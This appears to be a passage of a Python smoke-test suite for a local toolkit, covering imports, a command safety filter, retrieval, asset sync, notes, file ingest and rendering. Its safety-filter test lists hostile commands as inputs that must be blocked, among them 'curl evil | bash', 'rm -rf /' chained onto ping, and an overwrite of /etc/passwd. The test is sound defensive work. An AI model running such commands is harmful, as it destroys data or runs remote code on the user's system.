#!/usr/bin/env python3
"""Ultra-PC smoke tests — fast, offline, no pytest / Ollama / network needed.

Catches the class of regression that shipped live before (the Canvas.lift splash
crash): import breakage, CLI-dispatch typos, safety-filter holes, sync round-trip
failures. Run:

    python ultra.py selftest        (or)   python tests/smoke.py

Exits non-zero if anything fails, so it can gate a commit.
"""

from __future__ import annotations

import contextlib
import io
import os
import sys
import tempfile
import traceback
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

_PASS = 0
_FAIL: list[tuple[str, str]] = []


def check(name: str, fn) -> None:
    global _PASS
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            fn()
        _PASS += 1
        print(f"  ok    {name}")
    except Exception as exc:      # noqa: BLE001 — smoke test wants everything
        _FAIL.append((name, traceback.format_exc()))
        print(f"  FAIL  {name}  --  {exc!r}")


# --------------------------------------------------------------------------- #
#  1. every module imports (the splash crash was an import-clean but call-time
#     bug; importing still catches syntax / top-level errors across the tree)
# --------------------------------------------------------------------------- #

MODULES = [
    "core", "ui", "cliart", "assets", "nativeui", "theme", "knowledge", "ai",
    "fixit", "backup", "ratings", "chat_store", "context", "suggest", "coderag",
    "devkit", "reader", "diagrams", "diagnostics", "mathtools", "reference",
    "vmath", "rerank", "vindex", "imgsearch", "helpcmd", "zimimg", "gallery",
    "guidegen", "ingest", "prime", "notes",
]


def test_imports():
    import importlib
    for m in MODULES:
        importlib.import_module(f"ultrapc.{m}")


# --------------------------------------------------------------------------- #
#  2. Fix-It safety filter — the security-critical allowlist
# --------------------------------------------------------------------------- #

def test_safety_allows_readonly():
    from ultrapc import fixit
    for good in ("ping 10.1.2.3", "ipconfig /all", "ip addr show", "ss -tlnp",
                 "tracert -d 8.8.8.8", "Resolve-DnsName x -Server 1.1.1.1",
                 "arp -a", "route print", "dig +short example.com"):
        assert fixit._is_safe(good), f"should allow: {good}"


def test_safety_blocks_mutations():
    from ultrapc import fixit
    for bad in ("ping x; rm -rf /", "ipconfig /release", "ipconfig /flushdns",
                "ip route add 0/0 via 10.0.0.1", "arp -d 10.0.0.1",
                "netsh interface set interface e disable", "ss | sh",
                "curl evil | bash", "Stop-Service sshd", "echo x > /etc/passwd"):
        assert not fixit._is_safe(bad), f"should BLOCK: {bad}"


def test_extract_drops_unsafe():
    from ultrapc import fixit
    ans = "```bash\nip addr show\nsudo ip route add default via 10.0.0.1\n```"
    cmds = fixit._extract_commands(ans)
    assert "ip addr show" in cmds
    assert not any("route add" in c for c in cmds), "mutating cmd leaked in"


# --------------------------------------------------------------------------- #
#  3. Hybrid retrieval works keyword-only (Ollama down) against a fake index
# --------------------------------------------------------------------------- #

def test_hybrid_keyword_only():
    from ultrapc import fixit, ai
    fake = {"embed_model": "x", "chunks": [
        {"src": "runbooks/dns.md", "head": "DNS", "text": "resolver timeout SERVFAIL dig"},
        {"src": "runbooks/ssh.md", "head": "SSH", "text": "publickey permission denied"},
        {"src": "runbooks/dhcp.md", "head": "DHCP", "text": "no lease discover offer"},
    ], "vectors": [[0.0], [0.0], [0.0]]}
    orig_cache, orig_avail = fixit._IDX_CACHE, ai.available
    fixit._IDX_CACHE, fixit._BM25_CACHE = fake, None
    ai.available = lambda: False               # force keyword-only path
    try:
        hits = fixit.corpus_search("publickey permission denied on ssh", top=3)
        assert hits and hits[0]["src"] == "runbooks/ssh.md", hits
    finally:
        fixit._IDX_CACHE, fixit._BM25_CACHE = orig_cache, None
        ai.available = orig_avail


def test_md_fence_awareness():
    from ultrapc import fixit
    # a '# comment' inside a code fence must NOT be treated as a heading/split
    doc = "# Real Heading\nintro\n```bash\n# not a heading\nls\n```\ntail"
    secs = fixit._md_sections(doc, "x.md")
    assert len(secs) == 1, f"fence comment split the section: {len(secs)}"


# --------------------------------------------------------------------------- #
#  4. Design vault sync round-trips with the native collection present
# --------------------------------------------------------------------------- #

def test_assets_sync():
    from ultrapc import assets
    m = assets.sync()
    for key in ("native", "palettes", "techniques", "creative", "profiles",
                "shapes"):
        assert key in m["counts"], f"missing count: {key}"
    assert m["counts"]["native"] >= 17
    assert m["counts"]["profiles"] >= 13 and m["counts"]["shapes"] >= 40
    # the live demo is rebuilt by sync and must show EVERYTHING — this is
    # the guard that makes 'the demo page is missing our new stuff' extinct
    demo = assets.DEMO.read_text(encoding="utf-8")
    for key in assets.STYLES:
        assert f"assets kit {key}" in demo, f"demo missing style {key}"
    for pid in assets.PROFILES:
        assert f"assets profile {pid}" in demo, f"demo missing profile {pid}"
    for p in assets.PALETTES:
        assert p["id"] in demo, f"demo missing palette {p['id']}"
    for k in assets.GRADIENTS:
        assert f"<b>{k}</b>" in demo, f"demo missing gradient {k}"
    for k in assets.LAYOUTS:
        assert f"<b>{k}</b>" in demo, f"demo missing layout {k}"
    for k in assets.SHAPES:
        assert f"<b>{k}</b>" in demo, f"demo missing shape {k}"
    for k in assets.PATTERNS:
        assert f"<b>{k}</b>" in demo, f"demo missing pattern {k}"


def test_assets_cli_dispatch():
    from ultrapc import assets
    for argv in (["native"], ["status"], ["show", "gel-button"]):
        rc = assets.handle(argv)
        assert rc == 0, f"assets {argv} -> {rc}"


# --------------------------------------------------------------------------- #
#  5. nativeui renders a themed preview (skips cleanly if Pillow absent)
# --------------------------------------------------------------------------- #

def test_nativeui_preview():
    try:
        from ultrapc import nativeui
    except Exception:
        return
    if not getattr(nativeui, "ImageTk", True) and not hasattr(nativeui, "preview"):
        return
    out = Path(tempfile.gettempdir()) / "ultra_smoke_preview.png"
    try:
        nativeui.preview("cyberpunk", str(out))
        assert out.exists() and out.stat().st_size > 0
    except ImportError:
        pass          # PIL not installed — acceptable
    finally:
        with contextlib.suppress(OSError):
            out.unlink()


# --------------------------------------------------------------------------- #
#  6. Backup produces a real archive
# --------------------------------------------------------------------------- #

def test_nativeui_textures_and_components():
    # every texture renders at the requested size in any style; the component
    # generators produce sane images; color tools return valid hexes
    try:
        from ultrapc import nativeui as nui
    except Exception:
        return                          # PIL absent — acceptable
    for kind in nui.TEXTURES:
        img = nui.texture(kind, 120, 80, "cyberpunk")
        assert img.size == (120, 80), f"{kind}: {img.size}"
    assert nui.vignette(nui.grain(60, 40)).size == (60, 40)
    assert nui.neon_button(120, 40, "golden-archive", hover=True).size == (120, 40)
    assert nui.progress_img(200, 14, 0.5, "nordic").size == (200, 14)
    assert nui.progress_img(200, 14, 9.9, "nordic").size == (200, 14)  # clamps
    assert nui.toggle_img(True, "pastel").size == (56, 28)
    assert nui.badge_img("beta", "jewel").size[1] == 24
    assert nui.plaque(300, 66, "golden-archive").size == (300, 66)
    r = nui.ramp("#2b8fd6", 7)
    assert len(r) == 7 and all(h.startswith("#") and len(h) == 7 for h in r)
    har = nui.harmony("#2b8fd6")
    assert har["complement"].startswith("#") and len(har["triadic"]) == 2
    # WCAG tools: known extremes + auto-fix actually fixes
    assert abs(nui.contrast("#000000", "#ffffff") - 21.0) < 0.1
    fixed = nui.ensure_contrast("#888888", "#999999", 4.5)
    assert nui.contrast(fixed, "#999999") >= 4.5
    assert nui.on_color("#000000") == "#ffffff"


def test_design_profiles_integrity():
    # every reference inside a profile must resolve: style, palette, fonts on
    # disk, native textures, shapes, patterns, fx techniques — a profile that
    # points at nothing is a lie in the catalog
    from ultrapc import assets
    try:
        from ultrapc import nativeui as nui
        textures = set(nui.TEXTURES)
    except Exception:
        textures = None
    pal_ids = {p["id"] for p in assets.PALETTES}
    # profiles must be DESIGN BRIEFS, not component manifests: every
    # medium-agnostic narrative section present and substantial
    _NARRATIVE = ("vibe", "origins", "composition", "proportion", "color",
                  "light", "type", "materiality", "motion", "imagery",
                  "voice", "sound", "space", "kinship", "hierarchy", "canon",
                  "adaptation", "gloss", "rules", "failure")
    for pid, p in assets.PROFILES.items():
        for field in _NARRATIVE:
            assert len(p.get(field, "")) >= 80, f"{pid}: '{field}' too thin"
        assert len(p.get("era", "")) >= 10, f"{pid}: era missing"
        moves = p.get("moves", [])
        assert len(moves) >= 3, f"{pid}: needs >=3 signature moves"
        assert all(len(m) >= 30 for m in moves), f"{pid}: a move is too thin"
        # kinship must point at real relatives when it names our styles
        for ref in ("`pastel`", "`hi-contrast`", "`jewel`", "`editorial`"):
            if ref in p.get("kinship", ""):
                assert ref.strip("`") in assets.STYLES
        assert p["style"] in assets.STYLES, f"{pid}: style {p['style']}"
        assert p["palette"] in pal_ids, f"{pid}: palette {p['palette']}"
        assert p["style"] in assets.STYLE_FONTS, f"{pid}: no font pairing"
        for f in p["fonts"]["files"]:
            assert (assets.FONT_DIR / f).exists(), f"{pid}: font missing {f}"
        if textures is not None:
            for t in p["textures"]:
                assert t in textures, f"{pid}: texture {t}"
        for s in p["shapes"]:
            assert s in assets.SHAPES, f"{pid}: shape {s}"
            assert "<svg" in assets.SHAPES[s]["svg"], f"shape {s}: not svg"
        for pat in p["patterns"]:
            assert pat in assets.PATTERNS, f"{pid}: pattern {pat}"
        for fx in p["techniques"]:
            assert fx in assets.TECHNIQUES or fx in assets.CSS_SNIPPETS, \
                f"{pid}: fx {fx}"
    # every shape belongs to a real profile
    for sid, s in assets.SHAPES.items():
        assert s["profile"] in assets.PROFILES, f"shape {sid}: orphan profile"


def test_kb_search_tuning():
    # the ranking stack's rule layer: decisive demote/boost by title+path
    # substring, applied only when the rule's match term is in the query
    import json
    from ultrapc import knowledge
    rules = [{"id": 1, "match": "history", "demote": ["HIStory"],
              "boost": ["History of"], "note": "MJ album collision"}]
    hits = [
        {"title": "HIStory (Michael Jackson album)", "path": "A/HIStory",
         "score": 5.0},
        {"title": "History", "path": "A/History", "score": 4.0},
        {"title": "History of computing", "path": "A/History_of_computing",
         "score": 3.0},
    ]
    out = knowledge.apply_tuning("history articles", hits, rules)
    assert out[0]["title"] == "History of computing"      # boosted
    assert out[-1]["title"].startswith("HIStory"), "album must sink"
    assert out[-1]["tuned"] == "demoted"
    # case-significant patterns must NOT hit legitimate articles: 'HIStory'
    # may never demote 'History' — this exact bug shipped once in dev
    assert "tuned" not in out[1] or out[1]["tuned"] != "demoted", \
        "'HIStory' pattern leaked onto plain 'History'"
    assert knowledge._pattern_in("HIStory", "HIStory (album)")
    assert not knowledge._pattern_in("HIStory", "History of Rome")
    assert knowledge._pattern_in("thriller", "Thriller (album)")
    # rule must NOT fire when the match term isn't in the query
    hits2 = [{"title": "HIStory (Michael Jackson album)", "path": "A/H",
              "score": 5.0},
             {"title": "Thriller", "path": "A/T", "score": 4.0}]
    out2 = knowledge.apply_tuning("michael jackson albums", hits2, rules)
    assert out2[0]["title"].startswith("HIStory") and \
        "tuned" not in out2[0], "rule fired on an unrelated query"
    # rank_hits end-to-end shape (reranker may or may not load — safe no-op)
    with tempfile.TemporaryDirectory() as td:
        orig = knowledge.knowledge_dir
        knowledge.knowledge_dir = lambda: Path(td)
        try:
            knowledge.save_tuning(rules)
            assert knowledge.tuning_rules()[0]["match"] == "history"
            pool = [{"title": "HIStory (Michael Jackson album)",
                     "path": "A/HIStory", "book": "wiki", "snippet": "album"},
                    {"title": "History", "path": "A/History", "book": "wiki",
                     "snippet": "the study of the past"}]
            ranked = knowledge.rank_hits("history articles", pool, 5)
            assert ranked[-1]["title"].startswith("HIStory"), \
                "tuned rank must sink the album even end-to-end"
        finally:
            knowledge.knowledge_dir = orig


def test_notes_pipeline():
    # capture/store round-trip, offline organize fallback, due-date parsing,
    # and the tracker task builder — all without network or Ollama
    import json
    import re
    from datetime import datetime
    from ultrapc import core, notes
    orig_store = notes._store_path
    with tempfile.TemporaryDirectory() as td:
        notes._store_path = lambda: Path(td) / "notes.json"
        try:
            n = notes.capture("wifi audit bldg3 friday")
            assert n["id"] == 1 and n["status"] == "inbox"
            d = notes._load()
            assert notes._get(d, 1)["text"] == "wifi audit bldg3 friday"
            n2 = notes.capture("second thing")
            assert n2["id"] == 2, "ids must not repeat"
        finally:
            notes._store_path = orig_store
    # heuristic organize never returns an empty task
    h = notes._heuristic_organize("scan subnet friday")
    assert h["title"] and h["checklist"] and h["tags"]
    # research links are well-formed and query-encoded
    links = notes.search_links("wifi audit & report")
    assert len(links) == 3 and all("%26" in l["url"] or "+" in l["url"]
                                   for l in links)
    assert any("youtube" in l["url"] for l in links)
    # due-date parsing: conservative — unparsable returns None, never a guess
    tue = datetime(2026, 7, 14)               # a known Tuesday
    assert notes.parse_due_hint("", tue) is None
    assert notes.parse_due_hint("today", tue) == "2026-07-14"
    assert notes.parse_due_hint("tomorrow", tue) == "2026-07-15"
    assert notes.parse_due_hint("Friday", tue) == "2026-07-17"
    assert notes.parse_due_hint("friday", tue) == "2026-07-17"   # same day both ways
    assert notes.parse_due_hint("2026-08-01", tue) == "2026-08-01"
    assert notes.parse_due_hint("8/1", tue) == "2026-08-01"
    assert notes.parse_due_hint("next tuesday", tue) == "2026-07-21", \
        "'next <today's weekday>' must roll a full week, not return today"
    # prose forms the local model actually emits
    assert notes.parse_due_hint("Friday, July 25, 2026", tue) == "2026-07-25"
    assert notes.parse_due_hint("July 25", tue) == "2026-07-25"
    assert notes.parse_due_hint("25 July 2026", tue) == "2026-07-25"
    assert notes.parse_due_hint("Jan 5", tue) == "2027-01-05", \
        "a bare past month/day rolls to next year"
    assert notes.parse_due_hint("whenever I get to it", tue) is None
    assert notes.parse_due_hint("Notember 40, 2026", tue) is None
    # payload builder: title/professor/course land correctly, checklist and
    # research become readable notes text, keywords preserved, due resolved
    note = {"id": 1, "text": "wifi audit bldg3", "created": "2026-07-14",
            "title": "WiFi audit — building 3", "summary": "Audit the APs.",
            "checklist": ["Walk the floor", "Capture survey"],
            "due_hint": "friday",
            "links": notes.search_links("wifi audit")}
    e = notes.build_note_record(note)
    assert e["title"] == "WiFi audit — building 3"
    assert e["text"] == "wifi audit bldg3"           # raw capture preserved
    assert e["status"] == "open" and e["taskId"] is None
    assert e["due"] is not None            # "friday" resolved to a real date
    # organized parts stay STRUCTURED (the GUI refines them field by field)
    assert e["checklist"] == ["Walk the floor", "Capture survey"]
    assert any("youtube" in l["url"] for l in e["links"])
    assert re.match(r"^n-[0-9a-f]+$", e["id"]), "note ids are n-prefixed"
    assert e["id"] != notes.build_note_record(note)["id"], \
        "ids must not collide across calls"
    # a note with nothing organized still yields a usable record
    bare = notes.build_note_record({"id": 2, "text": "x", "created": ""})
    assert bare["title"] == "x" and bare["checklist"] == []
    # routing: keywords that start with a subcommand word still capture
    assert notes._route(["list", "bugs", "friday"]) == "capture"
    assert notes._route(["push", "deadline", "tomorrow"]) == "capture"
    assert notes._route(["show", "tomorrow"]) == "capture"
    assert notes._route(["list"]) == "list"
    assert notes._route(["list", "--all"]) == "list"
    assert notes._route(["push", "3"]) == "push"
    assert notes._route(["push", "all", "--again"]) == "push"
    assert notes._route(["organize", "all"]) == "organize"
    assert notes._route([]) == "list"
    # bad ids are friendly, not tracebacks
    assert notes._parse_id("abc") is None and notes._parse_id("7") == 7
    # kb research hygiene: junk pages filtered, titles humanized
    assert notes._kb_junk("questions/tagged/audit_page%3D11")
    assert not notes._kb_junk("A/Wireless_site_survey")
    assert notes._kb_title("A/Wireless_site_survey") == "Wireless site survey"
    # double-push guard: refuses silently duplicating a tracker task
    pushed = {"id": 9, "text": "x", "tracker_id": "t-abc123"}
    try:
        notes.push(pushed)
        assert False, "duplicate push was allowed"
    except notes.AlreadyPushed:
        pass
    # corrupt NOTES store is preserved aside, never silently overwritten
    with tempfile.TemporaryDirectory() as td:
        notes._store_path = lambda: Path(td) / "notes.json"
        try:
            (Path(td) / "notes.json").write_text("{corrupt!!", encoding="utf-8")
            d = notes._load()
            assert d["notes"] == []
            wrecks = list(Path(td).glob("notes.corrupt-*.json"))
            assert wrecks and "corrupt" in wrecks[0].read_text()
        finally:
            notes._store_path = orig_store
    # push() against a realistic tracker fixture: merges (doesn't clobber),
    # preserves hoursLog/version, resolves defaults from config.json, and —
    # critically — a malformed tasks.json is refused untouched, not wiped
    with tempfile.TemporaryDirectory() as td:
        t_dir = Path(td)
        (t_dir / "config.json").write_text(json.dumps({
            "professors": [{"id": "other", "name": "Other"}],
            "courses": [{"id": "personal", "name": "Personal", "kind": "other"}],
        }), encoding="utf-8")
        (t_dir / "tasks.json").write_text(json.dumps({
            "version": 1, "updated": "2026-01-01T00:00:00.000Z",
            "tasks": [{"id": "seed-1", "title": "existing task"}],
            "hoursLog": [{"id": "h-1", "hours": 2}],
        }), encoding="utf-8")
        orig_cfg = core.load_config
        core.load_config = lambda: {**orig_cfg(), "tracker_dir": str(t_dir)}
        try:
            n = {"id": 1, "text": "wifi audit bldg3 friday",
                "created": "2026-07-14T09:00:00"}
            notes.push(n)
            assert n["status"] == "pushed" and n["tracker_id"]
            data = json.loads((t_dir / "tasks.json").read_text(
                encoding="utf-8"))
            # notes land in notes[] — the task board stays untouched until
            # the user promotes them in the GUI
            assert [t["id"] for t in data["tasks"]] == ["seed-1"], \
                "push must not touch existing tasks"
            assert [x["id"] for x in data["notes"]] == [n["tracker_id"]]
            assert data["hoursLog"] == [{"id": "h-1", "hours": 2}]
            assert data["version"] == 1
            # a second push MERGES into notes[], never replaces
            n2 = {"id": 2, "text": "second note", "created": ""}
            notes.push(n2)
            data = json.loads((t_dir / "tasks.json").read_text(
                encoding="utf-8"))
            assert len(data["notes"]) == 2, "second push must merge"
            # push also writes the browser mailbox (tasks.seed.js) so the
            # tracker auto-merges on refresh — file:// can't fetch() but CAN
            # <script src> it. Must be valid JS assigning window.__ULTRA_SEED__
            # and mirror tasks.json exactly.
            seed_js = (t_dir / "tasks.seed.js").read_text(encoding="utf-8")
            assert seed_js.startswith("window.__ULTRA_SEED__ = ")
            seeded = json.loads(seed_js[len("window.__ULTRA_SEED__ = "):]
                                .rstrip().rstrip(";"))
            assert [t["id"] for t in seeded["tasks"]] == \
                [t["id"] for t in data["tasks"]], "seed must mirror tasks.json"
            # re-push without --again must refuse, not duplicate
            try:
                notes.push(n)
                assert False, "second push should have been refused"
            except notes.AlreadyPushed:
                pass
            before = (t_dir / "tasks.json").read_bytes()
            (t_dir / "tasks.json").write_text("{not json", encoding="utf-8")
            try:
                notes.push({"id": 2, "text": "y", "created": ""})
                assert False, "push onto a corrupt tracker file was allowed"
            except RuntimeError:
                pass
            assert (t_dir / "tasks.json").read_bytes() == b"{not json", \
                "a malformed tracker file must be left exactly as found"
        finally:
            core.load_config = orig_cfg


def test_ingest_pipeline():
    # the intake pipeline: classification, PBR grouping, dedup, dry-run
    # honesty, verified copy vs move, junk skipping, nothing ever lost
    from ultrapc import ingest
    assert ingest.pbr_set("RustyMetal_04_roughness") == "RustyMetal_04"
    assert ingest.pbr_set("Bricks-Normal") == "Bricks"
    assert ingest.pbr_set("wood_albedo_4k") == "wood"
    assert ingest.pbr_set("vacation_photo") is None
    with tempfile.TemporaryDirectory() as td:
        src = Path(td) / "dump"; root = Path(td) / "lib"
        src.mkdir()
        (src / "scene.blend").write_bytes(b"BLENDER-fake")
        (src / "scene.blend1").write_bytes(b"junk")
        (src / "chair.fbx").write_bytes(b"fbx-fake")
        (src / "Wall_albedo.png").write_bytes(b"\x89PNG-a")
        (src / "Wall_normal.png").write_bytes(b"\x89PNG-n")
        (src / "Screenshot 2026.png").write_bytes(b"\x89PNG-s")
        (src / "clip.mp4").write_bytes(b"mp4-fake")
        (src / "dupe.mp4").write_bytes(b"mp4-fake")          # same content
        (src / "weird.xyz").write_bytes(b"???")
        orig_root = ingest._root
        ingest._root = lambda: root
        try:
            plan = ingest.run(src, dry=True)                 # dry: no writes
            assert not root.exists() or not any(root.iterdir())
            assert plan["counts"]["junk"] == 1
            m = ingest.run(src)                              # real copy run
            assert (root / "Blender" / "scene.blend").exists()
            assert (root / "Models" / "fbx" / "chair.fbx").exists()
            assert (root / "Textures" / "Wall" / "Wall_albedo.png").exists()
            assert (root / "Textures" / "Wall" / "Wall_normal.png").exists()
            assert list((root / "Photos" / "Screenshots").rglob("*.png"))
            assert list((root / "Video").rglob("*clip.mp4"))
            assert list((root / "_Unsorted").rglob("weird.xyz"))
            assert not list(root.rglob("*.blend1")), "junk was filed"
            assert m["counts"].get("duplicate") == 1, "dedup missed the dupe"
            assert (src / "scene.blend").exists(), "copy mode deleted source!"
            # verified move: source gone only after the copy exists
            mv_src = Path(td) / "mv"; mv_src.mkdir()
            (mv_src / "take2.fbx").write_bytes(b"fbx-2")
            ingest.run(mv_src, move=True)
            assert not (mv_src / "take2.fbx").exists()
            assert (root / "Models" / "fbx" / "take2.fbx").exists()
            # manifest log written
            assert list((root / "_ingest" / "logs").glob("ingest-*.json"))
            # the library can never ingest itself
            try:
                ingest.run(root)
                assert False, "self-ingest was allowed"
            except ValueError:
                pass
            # one broken file costs one manifest line, never the run
            err_src = Path(td) / "err"; err_src.mkdir()
            (err_src / "good.fbx").write_bytes(b"fbx-good")
            (err_src / "bad.fbx").write_bytes(b"fbx-bad")
            orig_sha = ingest._sha256
            ingest._sha256 = (lambda p, chunk=1 << 20:
                              (_ for _ in ()).throw(OSError("cloud stub"))
                              if p.name == "bad.fbx" else orig_sha(p))
            try:
                m2 = ingest.run(err_src)
            finally:
                ingest._sha256 = orig_sha
            assert m2["counts"].get("error") == 1
            assert (root / "Models" / "fbx" / "good.fbx").exists(), \
                "a bad file aborted the run"
            # non-camera PNG stays out of the photo timeline
            misc_src = Path(td) / "misc"; misc_src.mkdir()
            (misc_src / "logo-download.png").write_bytes(b"\x89PNG-logo")
            ingest.run(misc_src)
            assert list((root / "Pictures").rglob("logo-download.png"))
            assert not list((root / "Photos").rglob("logo-download.png"))
            # modern texture suffixes (PolyHaven/AmbientCG style)
            assert ingest.pbr_set("plank_diff_4k") == "plank"
            assert ingest.pbr_set("plank_nor_gl_4k") == "plank"
            # render-output EXR is not an HDRI
            r = Path(td) / "render_pass_beauty.exr"
            r.write_bytes(b"\x00" * 64)
            assert ingest.classify(r) == "texture"
        finally:
            ingest._root = orig_root


def test_prime_session_primer():
    # the primer must compose a self-contained, paste-ready brief from pure
    # data — no network, no Ollama — degrading gracefully when the code index
    # or git isn't available
    from ultrapc import prime
    # snippet matching is keyword overlap, stopwords stripped
    hits = prime._match_snippets("hash a password securely", 4)
    ids = [sid for sid, _ in hits]
    assert any("password" in i or "hash" in i for i in ids), ids
    assert prime._match_snippets("xyzzy nonsense qqq", 4) == []
    # signature extraction prefers a def/class line
    sig = prime._first_signature("import os\n\ndef the_target(a, b):\n  pass")
    assert sig == "def the_target(a, b):"
    # a full primer is markdown with the load-bearing sections + conventions,
    # and never raises even with a bogus cwd (no git, no index match)
    with tempfile.TemporaryDirectory() as td:
        (Path(td) / "README.md").write_text("# Demo\n\nA thing.",
                                             encoding="utf-8")
        p = prime.build_primer("refactor the widget loader", td,
                               top_code=4, top_snips=4)
        assert p.startswith("# Session primer")
        assert "**Task:** refactor the widget loader" in p
        assert "## House conventions" in p and "core.write_atomic" in p
        # a repo-local conventions file overrides the baked default
        conv = Path(td) / ".ultra"; conv.mkdir()
        (conv / "conventions.md").write_text("- Always spellcheck.",
                                             encoding="utf-8")
        p2 = prime.build_primer("x", td)
        assert "Always spellcheck." in p2
    # dispatch: only claims its own verbs
    assert prime.handle(["prime", "do a thing"]) == 0
    assert prime.handle(["something-else"]) is None


def test_code_index_is_fresh():
    # the code-RAG index powers `ultra prime` — a stale/narrow index silently
    # degrades every primer. Guard that it still covers the package it's meant
    # to (catches 'forgot to reindex after adding modules').
    from ultrapc import coderag
    import ultrapc as pkg
    data = coderag._load()
    if not data:
        return                      # no index built here — acceptable in CI
    root = Path(data.get("root", ""))
    if root.name != "ultrapc":
        return                      # index points elsewhere — user's choice
    # only expect files coderag would actually index (respect its size cap)
    py_files = {p.stem for p in Path(pkg.__file__).parent.glob("*.py")
                if not p.stem.startswith("_")
                and p.stat().st_size <= coderag.MAX_FILE_BYTES}
    indexed = {Path(r["path"]).stem for r in data.get("records", [])}
    missing = py_files - indexed
    assert not missing, (f"code index is stale — missing {sorted(missing)}; "
                         "re-run `ultra code-index ultrapc`")


def test_guidegen_contract():
    # a generated module must honor the Workipedia contract: single file,
    # zero network requests, chapters as <h2 id="chN">, structural ids
    # present, themed by the requested profile's tokens
    from ultrapc import guidegen, assets
    outline = "Part I: Basics\n  Alpha\n  Beta\nPart II: More\n  Gamma\n"
    assert guidegen.parse_outline(outline) == [
        ("Part I: Basics", ["Alpha", "Beta"]), ("Part II: More", ["Gamma"])]
    assert guidegen.parse_outline("") == list(guidegen._DEFAULT_OUTLINE)
    with tempfile.TemporaryDirectory() as td:
        dest = guidegen.generate("Test Topic", "dark-academia",
                                 outline_text=outline, out_dir=td)
        html = dest.read_text(encoding="utf-8")
        assert dest.name == "Test_Topic_Guide.html"
        for sid in ('id="nav"', 'id="navsearch"', 'id="progress"',
                    'id="wrap"', 'id="topbar"', 'id="hamburger"'):
            assert sid in html, f"missing structural id: {sid}"
        for ch in ('<h2 id="ch1">1. Alpha', '<h2 id="ch2">2. Beta',
                   '<h2 id="ch3">3. Gamma'):
            assert ch in html, f"missing chapter anchor: {ch}"
        assert 'class="part" id="partI"' in html
        # xmlns is a namespace identifier, not a fetch — excuse it, ban the rest
        stripped = html.replace("http://www.w3.org/2000/svg", "")
        assert "http://" not in stripped and "https://" not in stripped, \
            "network dependency leaked in"
        toks = assets.STYLES["dark-academia"]["tokens"]
        assert toks["bg"] in html and toks["accent"] in html
        # collision-safe: generating again must not overwrite
        d2 = guidegen.generate("Test Topic", "dark-academia", out_dir=td)
        assert d2 != dest and d2.exists()
    # unknown style falls back safely rather than crashing
    with tempfile.TemporaryDirectory() as td:
        p = guidegen.generate("X", "not-a-style", out_dir=td)
        assert p.exists()


def test_styles_are_readable():
    # EVERY vault style (present and future) must clear readable minimums:
    # body text AA (4.5) on bg and surface; accent + muted at least 3.0 on bg.
    # This is the guard that keeps 'add a cool new style' from shipping an
    # unreadable one.
    try:
        from ultrapc import nativeui as nui
    except Exception:
        return
    from ultrapc import assets
    assert len(assets.STYLES) >= 14
    for name, s in assets.STYLES.items():
        t = s["tokens"]
        assert nui.contrast(t["text"], t["bg"]) >= 4.5, f"{name}: text/bg"
        assert nui.contrast(t["text"], t["surface"]) >= 4.5, f"{name}: text/surface"
        assert nui.contrast(t["accent"], t["bg"]) >= 3.0, f"{name}: accent/bg"
        assert nui.contrast(t["muted"], t["bg"]) >= 3.0, f"{name}: muted/bg"


def test_backup():
    from ultrapc import backup
    with tempfile.TemporaryDirectory() as d:
        arc = backup.run_backup(d)
        # arc is None only if the user genuinely has zero personal data on disk
        if arc is not None:
            assert arc.exists() and arc.stat().st_size > 0
            import zipfile
            assert zipfile.is_zipfile(arc)
            # personal notes must be inside whenever the store exists
            from ultrapc import notes as _notes
            if _notes._store_path().exists():
                with zipfile.ZipFile(arc) as z:
                    assert "knowledge/notes/notes.json" in z.namelist(), \
                        "backup lost the notes store"


def test_vmath_matches_reference():
    # the batched backend must agree with the old per-element cosine
    from ultrapc import vmath, ai
    import random
    random.seed(7)
    q = [random.random() for _ in range(256)]
    M = [[random.random() for _ in range(256)] for _ in range(40)]
    new = vmath.cosine_all(q, M)
    old = [ai._cosine(q, v) for v in M]
    assert max(abs(a - b) for a, b in zip(new, old)) < 1e-4, "vmath diverged"
    # dimension mismatch must not crash (returns zeros, like the old _cosine)
    assert vmath.cosine_all([1.0, 2.0], [[1.0, 2.0, 3.0]]) == [0.0]
    # stateful index agrees with topk
    assert vmath.Index(M).search(q, 1)[0][0] == vmath.topk(q, M, 1)[0][0]


def test_vmath_topk_memmap_matches():
    # chunked memmap search must agree with the in-memory Index (multi-block)
    from ultrapc import vmath
    import numpy as np
    import random
    random.seed(11)
    M = np.asarray([[random.random() for _ in range(64)] for _ in range(400)],
                   dtype=np.float32)
    q = [random.random() for _ in range(64)]
    a = vmath.Index(M).search(q, 5)
    b = vmath.topk_memmap(M, q, 5, chunk=97)      # small chunk forces >1 block
    assert {i for i, _ in a} == {i for i, _ in b}, (a, b)
    assert len(vmath.MemmapIndex(M, chunk=97).search(q, 3)) == 3


def test_zimimg_label():
    from ultrapc import zimimg
    assert zimimg._label("_assets_/h/!Map_of_the_World.png") == "Map of the World"
    assert zimimg._label("x/%22Cat%22.jpg") == '"Cat"'


def test_zimimg_truncate_lines():
    from ultrapc import zimimg
    with tempfile.TemporaryDirectory() as td:
        p = Path(td) / "m.jsonl"
        p.write_text("a\nb\nc\nd\n", encoding="utf-8")
        zimimg._truncate_lines(p, 2)
        assert p.read_text() == "a\nb\n"
        zimimg._truncate_lines(p, 0)
        assert p.read_text() == ""


def test_imgsearch_jsonl_meta_roundtrip():
    # streamed-index metadata: build byte offsets, then seek any row lazily
    import json as _json
    from ultrapc import imgsearch
    with tempfile.TemporaryDirectory() as td:
        d = Path(td)
        metas = [{"file": f"img{i}", "abs": f"http://x/{i}", "hash": f"h{i}"}
                 for i in range(6)]
        with open(d / "meta.jsonl", "w", encoding="utf-8") as f:
            for m in metas:
                f.write(_json.dumps(m) + "\n")
        off = imgsearch._ensure_offsets(d, 6)
        store = imgsearch._JsonlMeta(d / "meta.jsonl", off)
        try:
            assert len(store) == 6
            assert store[4]["file"] == "img4"
            assert store[0]["abs"] == "http://x/0"
        finally:
            store.close()      # release the handle so the temp dir can be removed


def test_rerank_graceful():
    # rerank must be a safe no-op when unavailable, and never reorder to junk
    from ultrapc import rerank
    items = [{"text": "a"}, {"text": "b"}]
    out = rerank.rerank("q", items, top_k=2)
    assert len(out) == 2 and {o["text"] for o in out} == {"a", "b"}


def test_imgsearch_cli_dispatch():
    from ultrapc import imgsearch
    rc = imgsearch.handle(["img", "list"])
    assert rc == 0, f"img list -> {rc}"
    assert imgsearch.handle(["other"]) is None


def test_help_dispatch():
    from ultrapc import helpcmd
